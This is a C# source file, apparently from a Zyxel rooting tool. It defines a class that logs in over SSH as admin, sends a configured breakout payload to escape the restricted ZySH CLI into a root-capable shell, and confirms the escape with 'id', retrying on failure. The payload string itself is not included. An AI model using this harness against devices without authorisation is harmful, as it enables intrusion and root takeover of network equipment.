using Renci.SshNet;

namespace ZyxelRoot;

/// <summary>
/// The admin (uid 21) SSH shell, broken out of the restricted ZySH CLI into a
/// plain <c>ash</c> using the configured breakout payload.
/// </summary>
/// <remarks>
/// Arms the <c>debug</c> root window (primary bootstrap) and, in the web-DAL
/// fallback path, writes the script files whose launch is injected as root.
/// </remarks>
internal sealed class SshAdminShell : SshShell
{
    private SshAdminShell(SshClient client, ShellStream stream)
        : base(client, stream)
    {
    }

    /// <summary>Opens an SSH pty (no exploit yet).</summary>
    public static SshAdminShell Open(ZyxelSettings settings, TimeSpan? timeout = null)
    {
        (SshClient client, ShellStream stream) =
            ConnectPair(settings.Host, settings.SshPort, settings.Username, settings.Password, timeout);
        return new SshAdminShell(client, stream);
    }

    /// <summary>
    /// Opens an SSH pty, waits for the ZySH prompt, runs the exploit and verifies
    /// that a real shell answers (<c>id</c>). Retries up to <paramref name="tries"/> times.
    /// </summary>
    public static async Task<SshAdminShell> OpenWithExploitAsync(
        ZyxelSettings settings,
        Action<string>? log = null,
        int tries = 4,
        CancellationToken ct = default)
    {
        if (string.IsNullOrWhiteSpace(settings.Exploit))
            throw new ZyxelRootException("the breakout payload (Zyxel:Exploit) is not configured");
        if (string.IsNullOrWhiteSpace(settings.ExploitConfirm))
            throw new ZyxelRootException("the breakout confirmation text (Zyxel:ExploitConfirm) is not configured");

        Exception? last = null;

        for (int attempt = 1; attempt <= tries; attempt++)
        {
            ct.ThrowIfCancellationRequested();
            SshAdminShell? shell = null;

            try
            {
                shell = await Task.Run(() => Open(settings), ct).ConfigureAwait(false);

                if (await shell.WaitForTextAsync("ZySH> ", 0, TimeSpan.FromSeconds(15), ct).ConfigureAwait(false) < 0)
                {
                    last = new ZyxelRootException("no ZySH> prompt");
                    log?.Invoke($"no ZySH> prompt (attempt {attempt}/{tries}), retrying...");
                    shell.Dispose();
                    await Task.Delay(1000, ct).ConfigureAwait(false);
                    continue;
                }

                long mark = shell.BufferEnd;
                await shell.SendRawAsync(settings.Exploit + "\n", ct).ConfigureAwait(false);

                if (await shell.WaitForTextAsync(settings.ExploitConfirm, mark, TimeSpan.FromSeconds(15), ct).ConfigureAwait(false) < 0)
                {
                    last = new ZyxelRootException("exploit not processed");
                    log?.Invoke($"exploit not processed (attempt {attempt}/{tries}), retrying...");
                    shell.Dispose();
                    await Task.Delay(1000, ct).ConfigureAwait(false);
                    continue;
                }

                // The spawned sh needs a moment to take over the pty.
                await Task.Delay(2000, ct).ConfigureAwait(false);
                await shell.SendRawAsync("export PATH=/sbin:/bin:/usr/sbin:/usr/bin:$PATH\n", ct).ConfigureAwait(false);
                await Task.Delay(800, ct).ConfigureAwait(false);
                await Task.Delay(300, ct).ConfigureAwait(false);
                shell.DiscardBuffered();

                CommandResult id = await shell.RunAsync("id", TimeSpan.FromSeconds(10), ct).ConfigureAwait(false);
                if (id.ExitCode is not null && id.Output.Contains("uid=", StringComparison.Ordinal))
                    return shell;

                last = new ZyxelRootException($"post-exploit verify failed (exit {id.ExitCode?.ToString() ?? "?"}, output {id.Output.Trim()})");
                log?.Invoke($"post-exploit verify failed rc={id.ExitCode} out={id.Output.Trim()} (attempt {attempt}/{tries}), retrying...");
                shell.Dispose();
                await Task.Delay(1000, ct).ConfigureAwait(false);
            }
            catch (OperationCanceledException) when (ct.IsCancellationRequested)
            {
                shell?.Dispose();
                throw;
            }
            catch (Exception ex)
            {
                last = ex;
                log?.Invoke($"admin shell attempt {attempt}/{tries} failed: {ex.Message}");
                shell?.Dispose();
                await Task.Delay(1000, ct).ConfigureAwait(false);
            }
        }

        throw new ZyxelRootException($"could not break ZySH out to a shell after {tries} attempts: {last?.Message}", last!);
    }
}
